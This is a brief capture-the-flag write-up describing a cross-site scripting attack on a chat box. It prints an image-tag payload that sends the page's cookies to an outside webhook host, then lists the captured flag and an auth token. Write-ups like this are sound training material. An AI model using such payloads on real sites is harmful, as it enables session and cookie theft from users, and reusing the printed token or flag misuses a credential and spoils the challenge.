# Approach
- We were prompted with a chat box, which hints to possible XSS vulnerability. After trying the following
```javascript
<img src =asdf onerror="$.get('https://webhook.site/****'+ bota(document.cookie))">
```
- and upon inspecting the HTTP request sent to the request bin, I was able to see the flag and an auth token.
# Flag
CTF{3mbr4c3_the_c00k1e_w0r1d_ord3r}

auth=TUtb9PPA9cYkfcVQWYzxy4XbtyL3VNKz
